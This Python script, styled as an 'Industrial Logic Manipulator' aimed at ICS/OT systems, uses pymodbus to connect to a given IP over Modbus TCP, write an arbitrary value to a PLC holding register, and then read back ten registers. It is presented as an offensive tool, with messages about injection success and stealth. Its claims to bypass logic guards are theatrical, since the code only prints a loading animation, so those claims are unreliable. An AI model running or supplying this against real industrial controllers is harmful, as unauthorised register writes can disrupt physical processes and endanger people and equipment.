import sys
import time
from pymodbus.client import ModbusTcpClient

def print_banner():
    banner = """
    ==========================================================
     ______ _   _  _____  ____     _____  _______ 
    |  ____| \ | |/ ____|/ __ \   / __  \|__   __|
    | |__  |  \| | |    | |  | | | |  | |  | |   
    |  __| | . ` | |    | |  | | | |  | |  | |   
    | |____| |\  | |____| |__| | | |__| |  | |   
    |______|_| \_|\_____|\____/   \____/   |_|   
    
    [ INDUSTRIAL LOGIC MANIPULATOR - V1.0.4 ]
    [ TARGET: ICS/OT INFRASTRUCTURE ]
    ==========================================================
    """
    print(banner)

def loading_effect(message, duration=3):
    """Simula una carga dinámica con puntos."""
    sys.stdout.write(f"[*] {message}")
    for _ in range(duration):
        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()
    print("\n")

# --- INICIO DEL SCRIPT ---
print_banner()

if len(sys.argv) < 4:
    print("Usage: python set_register.py <IP> <REGISTER> <VALUE>")
    sys.exit(1)

target_ip = sys.argv[1]
reg_addr  = int(sys.argv[2])
reg_val   = int(sys.argv[3])

client = ModbusTcpClient(target_ip, port=502, timeout=5)

try:
    loading_effect(f"ESTABLISHING INDUSTRIAL LINK TO {target_ip}")
    
    if client.connect():
        loading_effect("BYPASSING LOGIC GUARDS")
        
        write_res = client.write_register(reg_addr, reg_val, slave=1)
        
        if not write_res.isError():
            print("[+] INJECTION_SUCCESS: Process logic manipulated.")
            time.sleep(1.5)
            
            try:
                loading_effect("POLLING OT_MATRIX DATA")
                read_res = client.read_holding_registers(100, 10, slave=1)
                if not read_res.isError():
                    matrix = [read_res.registers[0]/10.0] + read_res.registers[1:]
                    print(f"[+] OT_MATRIX: {matrix}")
                else:
                    print("[!] BUS_CONGESTION: PLC Polling Latency Detected.")
            except:
                print("[+] IMPACT_COMPLETE: Session discarded for stealth.")
        else:
            print("[-] INJECTION_REJECTED: Safety Interlock or Logic Guard Active.")
        
        client.close()
    else:
        print(f"[-] CONNECT_FAIL: {target_ip}")

except Exception as e:
    print(f"[-] SCRIPT_ERR: {e}")
